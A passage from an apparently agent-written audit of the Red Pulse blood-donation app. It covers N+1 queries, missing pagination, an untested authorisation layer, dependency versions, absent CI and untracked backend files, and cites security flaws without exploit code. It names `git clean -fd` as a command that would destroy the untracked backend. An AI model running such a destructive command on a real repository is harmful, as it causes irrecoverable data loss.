- `InventoryService.addOrInitializeInventory` is called from inside `DonationService`'s transaction, so a unique-constraint race on `uq_hospital_blood_group` would abort the **entire donation completion** — including the status change and the donor cooldown. No retry.

---

## 11. Performance Issues

| ID | Severity | Problem | Evidence | Expected impact | Recommendation |
|---|---|---|---|---|---|
| **PERF-001** | **P1** | **Zero pagination on every list endpoint** | Verified: no `Pageable`/`Page`/`Slice`/offset in the backend. `getAllDonations`, `getAllAppointments`, `getAllRequests`, `getUserNotifications`, `listEmergencies`, `getAllHospitals`, `getAllUsers`, `getAllDonors`, `getManageHospitals`, `getAllAuditLogs`, `getLeaderboard`, `getRankedMatches` all call `findAll()` | At 10k donations / 50k notifications the response is multi-megabyte JSON, fully materialised in JVM heap on both sides. A resource-exhaustion vector and a guaranteed mobile-network failure | Adopt Spring Data `Pageable`; return the existing (empty) `PageResponse`; add `LIMIT` to every repository method; make pagination mandatory in the contract |
| **PERF-002** | **P1** | `DonorContributionService.getLeaderboard:100-131` — **N+1 + full scan** | `donorProfileRepository.findAll()`, then per donor `completedOnly(d.getUser().getId())` (1 query) plus a lazy `d.getUser()` load. Then a **second** `board.sort(...)` and a **third** pass rebuilding every object | O(N) queries. At 5,000 donors: 5,000 round-trips. This is the **public** `/api/donors/leaderboard` | One `GROUP BY donor_id` aggregate; `JOIN FETCH` the user; drop the object-rebuild pass |
| **PERF-003** | **P1** | `MatchingService.getRankedMatches:46-88` and `findNearbyDonors:135-158` — **full table scan + N+1** | `donorProfileRepository.findAll()`, then per donor a lazy `getUser()` and `getUser().isVerified()`; Haversine computed in Java | Every match request scans all donors. Also **defeats** `idx_donor_profiles_blood_group` and `idx_donor_profiles_city` entirely, because the filter is in Java | Filter by `blood_group IN (…)` and `availability_status='AVAILABLE'` in SQL; use PostGIS `ST_DWithin`/`ST_Distance`; batch-load users |
| **PERF-004** | **P1** | Donor contribution/milestone/badges/statistics each re-scan the donation table | `completedOnly()` is called independently by 4 public methods; `getStatistics` additionally re-queries *all* donations | Opening the contributions page fires 3–4 redundant donation queries | Cache the completed-donation aggregate on `donor_profiles` (which spec §6.3 wants anyway — DB-003) or memoise per request |
| **PERF-005** | **P1** | **All admin analytics load full tables and aggregate in Java** | `AdminService`: `donationRepository.findAll()`, `bloodRequestRepository.findAll()`, `inventoryRepository.findAll()`, `emergencyRepository.findAll()`, `donorProfileRepository.findAll()` across `getOverviewAnalytics`, `getDonationAnalytics`, `getBloodRequestAnalytics`, `getInventoryAnalytics`, `getBloodGroupAnalytics`, and all 6 CSV reports | The admin dashboard issues ~8 full-table materialisations. The **CSV reports serialise the entire database into a single `StringBuilder` in heap** — an OOM on a realistic dataset | Push aggregation to SQL (`COUNT`, `SUM`, `GROUP BY`); stream CSV with `StreamingResponseBody` |
| **PERF-006** | **P1** | N+1 on lazy relations in every response mapper | `DonationResponse.fromEntity` touches `getDonor()` and `getHospital()`; `AppointmentResponse.fromEntity` touches both plus `getBloodRequest()`; `NotificationResponse.fromEntity` touches `getUser()`; `AuditLogResponse.fromEntity` touches `getUser()`; `BloodRequestResponse.fromEntity` touches `getRequester()` | `/api/donations` with 500 rows ≈ 1,000 extra queries | `JOIN FETCH` in the repository finder methods, or `@EntityGraph` |
| **PERF-007** | **P1** | 1,105 kB single JS chunk, no code splitting | Confirmed by build output; Vite emits the >500 kB warning. 2,572 modules transformed | ~317 kB gzip on first paint, blocking, on every route including `/login`. Directly harms the emergency use case | `React.lazy` per route; `manualChunks` for `recharts` / `react-router` / `zod`; add a bundle budget |
| **PERF-008** | P2 | `AdminService.getAllUsers:206-224` — `findAll()` then filters role/status/search **in Java** | `contains()` per row on names and email | O(n) per request; **no index is usable** | `Specification`/`JpaSpecificationExecutor` or derived queries; add a `LOWER(email) LIKE` index or full-text search |
| **PERF-009** | P2 | `AuthService.forgotPassword` + `resetPassword` in-memory map | `passwordResetTokens` is a `ConcurrentHashMap` with no eviction | Unbounded heap growth driven by unauthenticated requests (AUTH-008) | Bounded cache with TTL eviction; move to a shared store |
| **PERF-010** | P2 | `AppointmentReminderService.sendDueReminders` loads all of tomorrow's appointments, then lazy-loads donor and hospital per appointment, inside one transaction | `findByAppointmentDate(tomorrow)` then `getDonor().getId()` and `getHospital().getHospitalName()` | Hourly N+1; holds a transaction open across N notification inserts | `JOIN FETCH`; batch the de-duplication `existsBy…` check into one `IN` query; consider batching writes |
| **PERF-011** | P2 | `HospitalController.java:22-24` and others import `Collections` / `PageResponse`-shaped helpers suggesting an abandoned pagination layer | Unused imports | Signals the pagination work was started and abandoned — consistent with PERF-001 | Complete or remove |
| **PERF-012** | P3 | `queryClient` defaults: `staleTime: 5 min`, `retry: 1`, no `gcTime`, no focus refetch | `main.tsx:14-20` | A 5-minute `staleTime` on emergency/inventory data means a hospital sees stale blood counts for up to 5 minutes, with no refetch on focus | Shorter `staleTime` for inventory/emergency; re-enable focus refetch; per-query overrides |
| **PERF-013** | P3 | `FE-106` hardcoded coordinates mean geo-matching cannot be indexed | `donorApi` writes `23.0225/72.5714` for every donor without GPS | Even a PostGIS upgrade would return meaningless results until this is fixed | Fix FE-031 first |

---

## 12. Code Quality Issues

### 12.1 Duplication

| ID | Issue | Evidence |
|---|---|---|
| **CQ-001** | **Two divergent `UserService` classes** | `UserProfileService` (live) vs `UserService` (dead, zero references). Different eligibility rules (50 kg + age 18–65 vs 45 kg, no age check). Different error types (`ResourceNotFoundException`/`BadRequestException` vs `ResponseStatusException`). Different update semantics (upsert vs create-only). ~200 duplicated lines |
| **CQ-002** | **Donor registration validation duplicated** | `AuthService.validateRegistration:329-351` and `AuthService.register:151-176` |
| **CQ-003** | **Badge/rank logic in four places with four different rule sets** | `DonorContributionService.computeBadges` (`Registered Hero`/`First Drop`/`Triple Lifesaver`/`Guardian Angel`); `getBadges` (`New Pioneer`/`Life Giver`/`Silver Lifesaver`/`Golden Guardian`); `getLeaderboard` (`Gold Champion`/`Silver Lifesaver`/`Active Donor`); `DonationService.verifyDonor:157-163` (`First Drop`/`Triple Lifesaver`/`Guardian Angel`/`Gold Life Saver`). **Four independent, mutually inconsistent badge taxonomies** |
| **CQ-004** | **"Lives saved" magic number `units * 3` in three places** | `DonorContributionService:33`, `:110`, and FE-135. Unexplained, unvalidated, unconfigurable domain constant |
| **CQ-005** | **Pagination unwrapping re-implemented 9 times** | `wrapPageResponse` in `httpHelpers.ts` is used by 8 adapters; `contributionApi` reimplements its own `normalizePage`; `adminApi.users/donors/hospitals/auditLogs` each call `wrapPageResponse` with no normalisation at all |
| **CQ-006** | **The blood-group array is copy-pasted 8 times** | `bloodRequestApi`, `contributionApi`, `donationApi`, `donorApi`, `emergencyApi`, `inventoryApi` each inline the same 8 literals in `asEnumValue(…)`. **This duplication is the direct cause of the enum-drift bugs FE-011/013/014/015 — there is no single source of truth to update** |
| **CQ-007** | **Magic coordinates in five places** | `MatchingService:41-44, 88-91, 109-112`; `donorApi:56,71,86`; `emergencyApi:39` |
| **CQ-008** | **Four byte-identical notifications pages** | `DonorNotificationsPage`, `RequesterNotificationsPage`, `HospitalNotificationsPage`, `AdminNotificationsPage` (~110 lines each, ~440 total) |

### 12.2 Complexity, layering, and coupling

See §6.3 (BE-150 … BE-156) for the full list. Summary:
- **Business logic in controllers** — `EmergencyOtpController` holds the entire SOS orchestration including the P0.
- **Direct repository access from a controller** — `DonorContributionController:27`.
- **Three coexisting authorization patterns** with no single auditable policy location — the direct cause of the 35-endpoint gap.
- **Three duplicate endpoints** returning identical results (`MatchingController:25,34,43`).
- **`AdminService` mixes five concerns** across 250 lines.
- **Magic constants inline in business logic** (18, 65, 50, 90, 3, 5, 30).
- **`UserProfileService.calculateEligibility` duplicates the dead `UserService` version.**

### 12.3 Maintainability and technical debt

- **13 zero-byte `.java` files** (§3.4) and **5 more classes with declaration-only references**.
- **22 dead frontend exports** (§5.10), 7 of which are accessibility primitives that were built and never wired.
- **A stray `package.json` + `package-lock.json` inside the Maven backend** declaring `firebase: ^12.19.0` — leftover from an abandoned Firebase JS SDK attempt. Untracked; no backend code uses it.
- **3 unused tracked assets** (`hero.png`, `typescript.svg`, `vite.svg`) — Vite template leftovers, 0 references.
- **A stale `target/test-classes/application.yml`** that is actively breaking the build (BE-001).
- **`tailwind.config.ts` is documentation-only** for Tailwind v4 (real tokens live in `index.css` `@theme`), yet it is a full `Config` object that will silently drift from the actual design system.
- **`tsconfig.app.json`** sets `baseUrl: "."` plus `ignoreDeprecations: "5.0"` — suppressing a deprecation rather than migrating off `baseUrl`.
- **`OpenApiConfig.java` is empty** yet springdoc is a dependency and `/v3/api-docs` is `permitAll` — the API has no curated metadata (no security scheme, no tag grouping) despite a spec document that enumerates roles and entities.
- **No `packageManager` field, no `engines` field** in `package.json`; no `.nvmrc`. The build is not pinned to a Node version.
- **No `LICENSE`** in a repository with a public GitHub remote.
- **No `.editorconfig`, no formatter, no pre-commit hook** — and no root `.gitattributes` declaring `charset = utf-8`, which is why the mojibake in FE-060/061/062 recurs.

> **Correction from the initial review:** page and component file sizes are **not** a concern. No page exceeds 212 lines (`AdminUsersPage.tsx`); no component exceeds 187 lines (`Fields.tsx`). Component boundaries in this codebase are genuinely good.

---

## 13. Dependency Audit

**Method:** `npm audit --omit=dev` (executed), `mvnw dependency:tree` (executed), plus manual inspection of `pom.xml` and `package-lock.json`. `mvn` is **not installed** on this machine; all Maven inspection was done offline through the committed `mvnw` wrapper against the warm local repository.

### 13.1 Frontend

```
$ npm audit --omit=dev
{
  "vulnerabilities": {},
  "metadata": { "vulnerabilities": { "info":0, "low":0, "moderate":0,
                                    "high":0, "critical":0, "total":0 },
                "dependencies": { "prod":88, "dev":344, "total":432 } }
}
```

**Zero known vulnerabilities in production dependencies.** This is a genuinely good result.

`package-lock.json` (lockfileVersion 3, 433 packages) is **fully in sync** with `package.json`: all 31 direct dependency ranges match the lock's root entry, and every installed version equals the locked version. **There is no dependency drift and no reproducibility problem.** *(An initial suspicion of drift from the version spread — e.g. `react` 19.2.8 vs declared `^19.1.1` — was investigated and found to be a false positive: the spread is entirely within the declared semver ranges, and the lock is authoritative.)*

| Package | Locked | Declared | Assessment |
|---|---|---|---|
| `react` / `react-dom` | 19.2.8 | `^19.1.1` | Current. No action |
| `vite` | 7.3.6 | `^7.1.7` | Current major. No action |
| `vitest` | 3.2.7 | `^3.2.4` | Current. No action |
| `typescript` | 5.9.3 | `~5.9.2` | Current. `tsc -b` clean. No action |
| `axios` | 1.20.0 | `^1.12.2` | Current. No action |
| `zod` | 4.5.4 | `^4.1.11` | Current; emits two Rollup `@__PURE__` annotation warnings during build (upstream zod comment placement). Cosmetic |
| `recharts` | 3.10.1 | `^3.2.1` | **The dominant contributor to the 1,105 kB bundle.** Lazy-load before considering any change |
| `react-router-dom` | 7.18.3 | `^7.9.3` | Current |
| `@tanstack/react-query` | 5.102.8 | `^5.90.2` | Current |
| `lucide-react` | 0.544.0 | `^0.544.0` | Pinned exactly. Tree-shakeable. No action |
| `jsdom` | 27.4.0 | `^27.0.0` | Dev-only, current |
| `eslint-plugin-react-hooks` | 5.2.0 | `^5.2.0` | **This is the v5 legacy line.** v5.2 is the last release of the legacy config; the modern flat-config plugin is v6 with `recommended-latest` (including React Compiler rules). `eslint.config.js:24` uses `reactHooks.configs.recommended.rules` from the legacy shape. **Recommended: migrate to v6** to enable compiler-based rules that catch effect-dependency bugs v5 misses. **Compatibility risk: low** — v6 keeps a flat config and stable rule names. Do this alongside, not before, the auth refactor |
| `@testing-library/user-event` | 14.6.7 | `^14.6.1` | **Declared but never used** (FE-145). Either adopt it in tests or remove it |
| `firebase` | 12.19.0 | — | **In `Red-Pulse Backend/red-pulse/package.json` — an untracked, orphaned manifest in a Maven module.** Delete (GH-005) |

**`npm ci` verification was not possible offline**; the lock↔`package.json`↔`node_modules` three-way match I performed is the equivalent guarantee.

### 13.2 Backend

| Package | Version | Assessment |
|---|---|---|
| `spring-boot-starter-parent` | **4.1.1** | Very new major. The modular starter names used (`spring-boot-starter-webmvc`, `-data-jpa-test`, `-flyway-test`, `-security-test`, `-webmvc-test`) confirm genuine Boot 4 usage |
| `springdoc-openapi-starter-webmvc-ui` | **2.8.13** | **Version-line mismatch.** springdoc 2.x targets Spring Boot 3.x; the Boot 4 line pairs with springdoc 3.x. **Not proven broken** — the condition report shows the beans matching and startup proceeds past it. **Recommended: verify against springdoc's Boot 4 support matrix before release.** If 2.8.13 is not certified for Boot 4, move to 3.x. **Compatibility risk: medium** — springdoc 3.x renames some auto-configuration properties and drops `springdoc.swagger-ui.*` v2 aliases in places |
| `jjwt-api/impl/jackson` | 0.12.6 | Current 0.12 line; correct `impl`/`jackson` runtime scoping. No action |
| `firebase-admin` | 9.4.3 | Current. **Effectively dead weight** — `FirebaseAdminConfig` is entirely commented out (AUTH-016), so nothing consumes it |
| `flyway-core` / `flyway-database-postgresql` | 12.4.0 | Boot-managed. Correctly split for Flyway 10+. No action |
| `postgresql` | 42.7.13 | Current, `runtime` scope. No action |
| `lombok` | Boot-managed | `optional` + `annotationProcessorPaths` on both `compile` and `test-compile`. Correctly configured |
| `junit-jupiter` | 6.0.3 | Boot-managed, current |
| `mockito-core` | 5.23.0 | Current, but self-attaching (BE-007) |
| `assertj-core` | 3.27.7 | Current |
| — | — | **No `spring-boot-starter-actuator`.** No health endpoint, no metrics, no probe. A genuine production-readiness gap |
| — | — | **No embedded/test database** — see BE-002 |
| — | — | **No dependency-vulnerability scanning of any kind** — no OWASP dependency-check, no Dependabot, no SCA in CI (there is no CI) |

**No actual duplicate dependencies found.** `spring-boot-starter-flyway` (compile) + `spring-boot-starter-flyway-test` (test), and `spring-boot-starter-webmvc` + `spring-boot-starter-webmvc-test`, are both legitimate Boot 4 modular starters.

---

## 14. Testing Audit

### 14.1 What exists

| Suite | Files | Tests | Result |
|---|---|---:|---|
| Backend | 4 | **7** | **6 pass, 1 FAILS** (`contextLoads`, BE-001/BE-002) |
| Frontend (`npm test`) | 4 collected | **9** | 9 pass, exit 0 |
| Frontend (`*.integration.test.ts`) | 1 | — | **Never executed** — excluded by `vitest.config.ts:12`; its runner script is broken (FE-001) |

### 14.2 Coverage matrix

| Area | Existing tests | Missing tests | Risk |
|---|---|---|---|
| **Authorization / IDOR** | **NONE** | Every one of the 33 unauthorised endpoint/verb pairs; the role matrix for all 4 roles; cross-tenant access; the absent principal on `PATCH /appointments/{id}/complete` | **CRITICAL** — SEC-001/004 and BE-104 are entirely undetected. A single `@WithMockUser(roles="DONOR")` test on `POST /api/donations` would have caught a P0 |
| **Authentication** | 3 validation tests in `AuthServiceValidationTest` (ADMIN-role rejection, donor-field requirement, gender enum) | Login, logout, refresh, rotation, reuse detection, blocked-user login (AUTH-006), expired token, malformed token, revocation, **refresh-token-as-access-token (AUTH-001)** | **CRITICAL** |
| **OTP / emergency SOS** | **NONE** | Attempt-counter durability (SEC-003), rate limiting, expiry, resend cooldown, **account resolution by phone/email (SEC-001)**, verification single-use | **CRITICAL** — the P0 lives entirely untested |
| **Business logic** | **NONE** | Eligibility rules (age/weight/cooldown), inventory ADD/DEDUCT/SET, donation lifecycle state machine (BE-103), appointment conflict detection, blood-group compatibility matrix, match scoring, badge rules | **HIGH** — 4 divergent eligibility/badge implementations, zero tests to arbitrate |
| **Controllers (MockMvc/WebMvcTest)** | **NONE** | Status codes, validation (`@Valid`), error shapes, principal binding | **HIGH** — BE-140 (`ForbiddenException` → 500) would be caught by one test |
| **Repositories** | **NONE** | Derived queries, the pessimistic-lock OTP finder, `markAllAsReadByUserId` bulk update, pagination | MEDIUM |
| **Migrations** | **NONE** | Flyway validate on a clean schema; `ddl-auto: validate` against the migrations | **HIGH** — would have caught BE-003, DB-007, DB-008 |
| **Error handling** | **NONE** | Each `@ExceptionHandler`; the missing ones; info-leak assertions | HIGH — BE-141/SEC-006 |
| **Frontend: API adapters** | **NONE** | All 18 adapters, all ~25 normalisers, `asEnumValue` fallbacks, `wrapPageResponse` | **HIGH** — FE-100/101/107/108/109/110/111 and the fabricated-data bugs FE-030/031/032/103/104/105/106 all live here, untested |
| **Frontend: axios interceptors** | **NONE** | 401→refresh→replay, `refreshPromise` dedup, `_retry` guard, `isRefreshCall` guard, `unauthorizedHandler`, timeout | **HIGH** — FE-040 (403 vs 401) is exactly the kind of bug one mocked-401 test finds |
| **Frontend: AuthContext** | **NONE** | Bootstrap from token, refresh-on-boot, logout, 401 handling, `loading` transitions | HIGH |
| **Frontend: routes/guards** | 2 tests (redirect-to-login, 404) | Per-role matrix for all 4 roles, deep-link `state.from` (FE-048), `/forbidden` | MEDIUM |
| **Frontend: forms** | 2 render smoke tests + 4 Zod schema tests | Submission, validation-error display, double-submit prevention, API-error surfacing, loading/disabled states | MEDIUM — **the 4 "tests" that pass for `inventory`/`bloodRequest` assert Zod behaviour, not application behaviour.** No regression protection for the actual forms |
| **Frontend: components** | **NONE** | Rendering, props, a11y, keyboard nav, modal focus management (FE-122) | MEDIUM |
| **E2E** | **NONE** | Every critical journey | **HIGH** — no Playwright/Cypress at all |
| **Load / performance** | **NONE** | The unpaginated endpoints under realistic volume | MEDIUM |

### 14.3 Test-suite quality problems

1. **The backend suite is not hermetic** (BE-002) and **fails** (BE-001). There is no green backend build.
2. **`RedPulseApplicationTests.contextLoads` is a false signal.** It asserts only that a context loads; it caught nothing across its entire life while 13 empty `@Component`/`@Service`-adjacent files and 3 stubbed features shipped. Worse, `DataInitializer`, `SwaggerAutoOpen` and the email services are all constructed during it, so it is a smoke test **with side effects**.
3. **`InMemoryOtpStoreTest` tests dead code.** The whole `common/otp` package has zero production consumers. A passing test on an orphan gives **false confidence in exactly the area where the P0s live**.
4. **`AuthServiceValidationTest` uses the 7-argument `AuthService` constructor**, which substitutes a **no-op lambda** for `EmailService` (`:75-76`). The test therefore asserts nothing about the email path — and the email path is 100% broken.
5. **Mockito self-attach warning** (BE-007) — a forward-compatibility break with no action taken.
6. **No coverage plugin.** No JaCoCo, no Istanbul, no threshold, no report in `target/`. There is no objective measure of what is tested.
7. **No test naming or layering convention**, no fixtures/builders, no `src/test/resources`, no `application-test.yml`.
8. **Frontend: `bloodRequest.test.tsx` and `inventory.test.tsx` contain no React at all** despite the `.tsx` extension — they test Zod schemas. `auth.test.tsx` and `routes.test.tsx` are pure smoke-renders. `routes.test.tsx:28`'s `getAllByText(/Red Pulse/i).length > 0` matches the logo, footer, title and MockBanner — **it cannot fail for any meaningful reason**.
9. **No `msw`/fetch mock exists**, so no frontend test *can* test a network path. This is why the only integration test had to hit a live server. `@testing-library/user-event` is installed but unused.
10. **The three schema tests never assert *which* error message is produced** — only `success === false`. A user-facing regression like `'Units must be 20 or fewer'` → `'too_big'` would pass CI.
11. **`frontend.integration.test.ts` asserts behaviour that cannot be true** (mock-only credentials against the real backend — FE-119) and shares **mutable module-scope `let` bindings** across its 7 `it` blocks with no `beforeAll` or ordering guarantee — so any single failure cascades into five unrelated failures with misleading names. It also **creates 4 permanent real users per run**.

### 14.4 The mock layer

The mock system is **the best-engineered part of the frontend** and deserves explicit credit:

- Wiring is clean and type-safe: `env.ts:3` → `api/index.ts:5` swaps between two bundles that both satisfy `ApiBundle`.
- Mock mode is **honestly surfaced** to users via `MockBanner` in all three layouts, a demo-credentials alert on the login page, and explicit labelling on `HomePage`'s stats.
- **No mock credential, token, or phone number leaks into the real API path** — the bundles are fully isolated. (The one exception is FE-119: the *test* bypasses the isolation.)
- Tokens are structurally derived (`mock-access-${id}`), not fake JWTs.

**However, the mocks actively conceal the production bugs:**

> Mock analytics payloads are shaped to the frontend's `{series, breakdown}` contract, which is **not** what the real endpoints return. Mock mode therefore shows four working admin charts; real mode shows four empty ones. **The mock layer gave false confidence in exactly the area that is broken (FE-101/102).**

The same applies to `EmergencyRequest.status: 'OPEN'` (mirroring the real enum bug) and to the absence of any `INACTIVE` user, which makes the `AdminUsersPage` INACTIVE bug untestable in mock mode.

Additional mock-only defects:
| Severity | Defect |
|---|---|
| **P1** | `verifyAndDispatch` returns `'mock-access-token-requester'`, but the mock's own `currentUserFromToken` only parses `mock-access-${userId}` → every request after a mock SOS 401s with "Your session has expired" |
| P2 | `verifyAndDispatch` never registers its refresh token in `db.refreshTokens`, so `refresh()` always 401s |
| P2 | `hospitalApi.getMe` returns `db.hospitals[0]` — **every hospital user is logged in as hospital-1** and reads the wrong facility's data |
| P2 | `resetPassword` ignores which account is being reset — it only ever rewrites the donor demo password, for **any** token; and accepts any non-empty token with no expiry |
| P2 | `notificationApi.markRead`/`remove` do not verify the notification belongs to the caller |
| P2 | `locationApi.nearbyDonors` ignores its arguments and always returns `matches['req-1']` |
| P3 | `getDonorLocation` reads module-level `locations` while `updateDonorLocation` mutates it in place — mutations leak across "sessions" |
| P3 | `inventoryApi.create` uses `LOW` at `<= 3` but `updateStock` uses `CRITICAL` at `<= 2` — two thresholds for one concept, neither matching the backend's `<= 5 / == 0` |
| P3 | `User.status` has no `INACTIVE` case |

---

## 15. DevOps / Deployment Audit

| ID | Severity | Issue | Detail |
|---|---|---|---|
| **DO-001** | **P0** | **No CI/CD of any kind** | Verified: no `.github/`, no workflows, no `Jenkinsfile`, no `.gitlab-ci.yml`, no `azure-pipelines.yml`, no `bitbucket-pipelines.yml`. `git log --all --diff-filter=A` shows a CI config **has never existed** in this repository's history. Nothing enforces the build, the tests, linting, or dependency scanning |
| **DO-002** | **P0** | **No containerisation** | No `Dockerfile`, no `docker-compose.yml`, no `.dockerignore`, no k8s manifests, no Helm chart, no `fly.toml`, no `Procfile`, no `nginx` config — verified across the entire tree |
| **DO-003** | **P0** | **The backend is not in version control** | `git ls-files` shows **2** backend files tracked (`DonorContributionResponse.java`, `DonorLeaderboardResponse.java`); **180 files are untracked**, including `pom.xml`, `mvnw`, all 102 Java sources, all 9 migrations, and all 3 `application*.yml`. A single `git clean -fd` or a fresh clone loses the entire backend irrecoverably |
| **DO-004** | **P1** | **130 of 132 tracked frontend files are modified and uncommitted** | The only commit on `main` is `e5bf2e5 "Add Red Pulse frontend"` (2026-09-10). The working tree has diverged almost completely and has never been committed. **There is no point in this repository's history at which the application as it exists today could be reconstructed** |
| **DO-005** | **P1** | **The build is red and cannot be made green without a live database** | `mvnw test` → exit 1. Any CI gate must be preceded by BE-001 + BE-002 |
| **DO-006** | **P1** | **No health-check endpoint** | `spring-boot-starter-actuator` is absent. No `/actuator/health`, no liveness/readiness probe. A load balancer or orchestrator has nothing to probe — which is presumably part of why there is no containerisation |
| **DO-007** | **P1** | **Production environment is not deployable as documented** | Three independent blockers: (a) CORS hardcoded to `http://localhost:5173` with no prod origin (AUTH-013) — the deployed frontend is blocked; (b) `VITE_API_BASE_URL` lives in a git-ignored `.env`, so a CI build produces a bundle pointing at `http://localhost:8080` (FE-052); (c) `application-prod.yml` is empty (BE-005) |
| **DO-008** | **P1** | **`EMAIL_OTP_ENABLED` and `MAIL_USERNAME` are absent from the committed `.env`** | `application.yml:63` defaults `app.emergency-otp.enabled` to `false`; `.env` sets neither it nor `MAIL_USERNAME`. `ensureConfigured()` therefore throws `BadRequestException` on every OTP request — **the entire emergency SOS feature is non-functional in the committed configuration**, and the failure surfaces as a 400 blaming the user's input |
| **DO-009** | P2 | **Copying `.env.example` verbatim breaks startup** | `.env.example:14` ships `JWT_SECRET=your_jwt_secret_key_here`, which does not yield ≥32 bytes. `JwtUtils:26-28` throws `WeakKeyException`. The single documented onboarding path produces a crash with an opaque error |
| **DO-010** | **P1** | **The default (no-profile) configuration is non-functional for three core features** | With no `dev`/`test` profile: `UnconfiguredProductionEmailService` throws on every password-reset request; `SharedOtpStore` throws `UnsupportedOperationException` on every OTP operation; `UnconfiguredProductionSmsService` throws on every SMS. Meanwhile in a `dev` profile with `APP_NOTIFICATIONS_DEV_ENABLED=false` (the default), **no `EmailService` bean exists at all** and `AuthService`'s constructor injection fails → **the context will not start**. **There is no configuration in which the documented feature set works** |
| **DO-011** | P2 | **Secrets are supplied by a hand-rolled `.env` parser in `main()`** | `RedPulseApplication.loadEnv():21-40` reads `.env` from the process CWD and pushes values into **System properties**, duplicating `spring.config.import: optional:file:.env[.properties]`. The parser ignores quoting, has no escape handling, silently swallows all exceptions, and depends on the working directory. This duplication is a direct contributor to the BE-001 diagnosis confusion |
| **DO-012** | P2 | **No graceful shutdown** | `server.shutdown` is not set; no `ContextClosedEvent` handling; in-flight transactions and the `@Scheduled` reminder job have no drain behaviour |
| **DO-013** | P2 | **No observability** | 8 `log.*` calls in the entire backend; **zero logging in `GlobalExceptionHandler`**; no correlation/trace IDs; no structured logging; no metrics; no actuator; no request logging; no SQL logging. There is no way to detect, diagnose, or measure anything in production |
| **DO-014** | P2 | **No database backup, restore, or migration-rollback plan** | No `pg_dump` script, no PITR configuration, no documented RPO/RTO, no rollback procedure. Flyway gives forward-only migration with no down-migrations (V1–V9 are all up-only) |
| **DO-015** | P2 | **Swagger auto-opens on startup in every profile** (BE-133) and `/v3/api-docs` is `permitAll` in production (SEC-013) | |
| **DO-016** | P2 | **No `.editorconfig`, no formatter, no pre-commit hook** | Backend formatting is visibly inconsistent. A `.gitattributes` exists in the backend but not at the root, and covers only `mvnw`/`*.cmd` |
| **DO-017** | P3 | **Node/npm versions are unpinned** | No `packageManager`, no `engines`, no `.nvmrc`. Builds are not reproducible across machines |
| **DO-018** | P3 | **The Maven wrapper is untracked** (DO-003) and `distributionType=only-script` requires a network download of Maven 3.9.16 on first use | First build on a clean machine requires network access to `repo.maven.apache.org` |
| **DO-019** | P3 | **`.gitignore` ignores `HELP.md`** in the backend | Harmless but signals the ignore file was not reviewed |
| **DO-020** | P3 | **Google Fonts loaded from a CDN** in `index.html` with no self-hosting and no CSP | Third-party availability and privacy dependency |

---

## 16. Git / Repository Hygiene

| ID | Severity | Issue | Evidence |
|---|---|---|---|
| **GH-001** | **P0** | **Backend entirely untracked (180 files)** | `git ls-files` → 2 backend files. `git status --short` → the whole `Red-Pulse Backend/red-pulse/{src,pom.xml,mvnw,.mvn}` tree is `??` |
| **GH-002** | **P0** | **Only 1 commit on `main`; 130 files uncommitted; dangling checkpoint** | `git rev-list --count HEAD` = 1 (`e5bf2e5`, 2026-09-10). A second commit (`2e9a910 copilot checkpoint`) exists in the object store but is **unreachable from any branch**. The branch `jaygajjar52-production-readiness-fixes` points at the same commit as `main` — no divergence |
| **GH-003** | **P1** | **No `README.md` anywhere** | Only `HELP.md` (Spring Initializr boilerplate, and itself gitignored) and the spec matrix. A new developer has no setup instructions, no architecture overview, no API documentation, no port/credential guidance, and no way to learn that `.env` must be created from `.env.example` (which, per DO-009, crashes) |
| **GH-004** | **P1** | **No `LICENSE`** with a public GitHub remote (`https://github.com/Jaygajjar52/red-pulse-.git`) | No licence = no legal grant to use, fork, or contribute |
| **GH-005** | P2 | **Stray `package.json` + `package-lock.json` inside the Maven backend** declaring `firebase: ^12.19.0` | Untracked; zero backend usage. Pure cruft from an abandoned approach |
| **GH-006** | P2 | **Three unused template assets tracked:** `src/assets/hero.png` (12.8 KB), `typescript.svg`, `vite.svg` | Verified 0 references across `src/**` and `index.html` |
| **GH-007** | P2 | **`.idea/` is present in the working tree** | Correctly ignored by the root `.gitignore` (`**/.idea/`), so not committed — but it is local IDE state adding noise |
| **GH-008** | P2 | **`.gitignore` does not cover all build output** | The backend `.gitignore` ignores `target/`, but the **root** `.gitignore` has no `*.jar` rule; the backend `.gitignore` is itself untracked (GH-001), so the ignore rules protecting the backend are not yet in force |
| **GH-009** | P3 | **The repository name is malformed:** `red-pulse-` (trailing hyphen) | Cosmetic but persists in clone URLs |
| **GH-010** | P3 | **Encoding corruption is committed** | `constants/blood.ts:41` (`hospital�?Ts`) and `utils/format.ts:5,12,19` (`'�?"'`) are **in the tracked file** `e5bf2e5`. There is no root `.gitattributes` and no `.editorconfig` declaring `charset = utf-8`, so this class of corruption (also present in `DonorContributionService.java:110-111`) will recur |
| **GH-011** | P3 | **Line endings are inconsistent** between backend files | Visible in raw inspection; only `mvnw`/`*.cmd` are pinned via the backend `.gitattributes` |
| **GH-012** | — | **Secrets are correctly NOT committed** | `git check-ignore -v` confirms `Red-Pulse Backend/red-pulse/.env`, `Red Pulse-Frontend/.env`, `startup.log`, `target/*.jar` and `dist/*` are all ignored; `git ls-files --error-unmatch` on the backend `.env` errors with "did not match any file(s) known to git". A full-repo regex scan for API keys, private keys, GitHub/Slack/AWS tokens and JWTs found **zero hits in tracked files**. Handled correctly |
| **GH-013** | — | **No large files committed** | Largest tracked file is `package-lock.json` at 208.6 KB. `.git` is 1.97 MB. Healthy |
| **GH-014** | — | **Git history was not modified** | Per instruction: no commits, no branches, no history rewrites, no `git gc`, no `git clean`. Read-only inspection only |

---

## 17. Business Logic Problems

Comparing `ROLES_AND_ENTITIES_WORKFLOW_MATRIX.md` (the declared "single source of truth", v1.0.0) against the implementation.

### 17.1 Features that are stubs returning false success

| ID | Severity | Feature | Spec promise | Reality |
|---|---|---|---|---|
| **BL-001** | **P0** | Donor notification / match invitation | §2 Role 1: "Accept or decline incoming donation invitations"; §6 step 3 "Alert Dispatch" | `MatchingService.notifyDonor:118-131` returns `"Donation request notification sent to donor successfully"` and sends nothing. No accept/decline model, endpoint, or state exists |
| **BL-002** | **P0** | Emergency broadcast | §2 Role 2: "Broadcast instant alerts to all active donors in the hospital's geographic area"; §3 Entity 6 "triggers push/SMS notifications" | `EmergencyRequestService.alertDonors:66-79` returns `"Emergency SOS broadcast dispatched to nearby eligible donors"` and dispatches nothing. `EmergencyOtpController:101` pre-sets `ALERT_SENT` so every emergency *appears* alerted. No push, SMS, or email donor notification exists anywhere |
